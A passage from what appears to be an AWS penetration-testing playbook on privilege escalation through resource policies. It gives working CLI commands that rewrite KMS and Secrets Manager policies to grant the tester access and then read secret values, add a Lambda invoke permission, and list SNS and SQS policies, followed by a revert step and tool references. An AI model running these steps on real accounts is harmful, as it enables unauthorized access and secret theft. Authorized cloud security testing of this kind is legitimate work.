        "Principal": {"AWS": "arn:aws:iam::<ACCOUNT_ID>:user/<CURRENT_USER>"},
        "Action": "kms:*",
        "Resource": "*"
      },
      {
        "Sid": "ExistingAdminAccess",
        "Effect": "Allow",
        "Principal": {"AWS": "arn:aws:iam::<ACCOUNT_ID>:root"},
        "Action": "kms:*",
        "Resource": "*"
      }
    ]
  }'

Step 3 (Secrets Manager): List secrets and attempt to modify a secret's resource policy.
  aws secretsmanager list-secrets --query "SecretList[*].[Name,ARN]" --output table
  aws secretsmanager get-resource-policy --secret-id <SECRET_ARN>
  aws secretsmanager put-resource-policy --secret-id <SECRET_ARN> --resource-policy '{
    "Version": "2012-10-17",
    "Statement": [
      {
        "Sid": "PentestAccess",
        "Effect": "Allow",
        "Principal": {"AWS": "arn:aws:iam::<ACCOUNT_ID>:user/<CURRENT_USER>"},
        "Action": "secretsmanager:GetSecretValue",
        "Resource": "*"
      }
    ]
  }'
  aws secretsmanager get-secret-value --secret-id <SECRET_ARN>

Step 4 (Lambda): Attempt to add a resource policy to an existing Lambda function to allow invocation.
  aws lambda add-permission \
    --function-name <FUNCTION_NAME> \
    --statement-id PentestInvoke \
    --action lambda:InvokeFunction \
    --principal arn:aws:iam::<ACCOUNT_ID>:user/<CURRENT_USER>
  aws lambda invoke --function-name <FUNCTION_NAME> /tmp/lambda-resource-policy-output.json

Step 5 (SNS/SQS): Check if SNS topic or SQS queue policies can be modified.
  aws sns list-topics
  aws sns get-topic-attributes --topic-arn <TOPIC_ARN> --query "Attributes.Policy"
  aws sqs list-queues
  aws sqs get-queue-attributes --queue-url <QUEUE_URL> --attribute-names Policy

Step 6: [DOCUMENT ONLY] Revert all resource policy modifications after validation.
  aws s3api delete-bucket-policy --bucket <BUCKET_NAME>
  aws lambda remove-permission --function-name <FUNCTION_NAME> --statement-id PentestInvoke

Flag: Any resource policy is successfully modified to grant the tester access to a resource they could not previously access, confirmed by successfully performing the previously unauthorized action against that resource.

------------------------------------------
References:
- Rhino Security Labs - AWS IAM Privilege Escalation Methods: https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/
- Rhino Security Labs - Updated IAM Privilege Escalation (2020): https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/
- Pacu Framework (iam__privesc_scan module): https://github.com/RhinoSecurityLabs/pacu
- PMapper (Principal Mapper): https://github.com/nccgroup/PMapper
- CloudSplaining - AWS IAM Security Assessment: https://github.com/salesforce/cloudsplaining
- AWS Official Documentation - IAM Actions: https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_actions-resources-contextkeys.html
- AWS Official Documentation - PassRole: https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_use_passrole.html
- AWS Official Documentation - Resource-Based Policies: https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_identity-vs-resource.html
- HackTricks Cloud - AWS Privilege Escalation: https://cloud.hacktricks.xyz/pentesting-cloud/aws-pentesting/aws-privilege-escalation
- Bishop Fox - AWS IAM Privilege Escalation: https://bishopfox.com/blog/aws-iam-privilege-escalation
- Prowler - AWS Security Best Practices: https://github.com/prowler-cloud/prowler
- ScoutSuite - Multi-Cloud Security Auditing: https://github.com/nccgroup/ScoutSuite
- CloudFox - Finding Exploitable Attack Paths: https://github.com/BishopFox/cloudfox
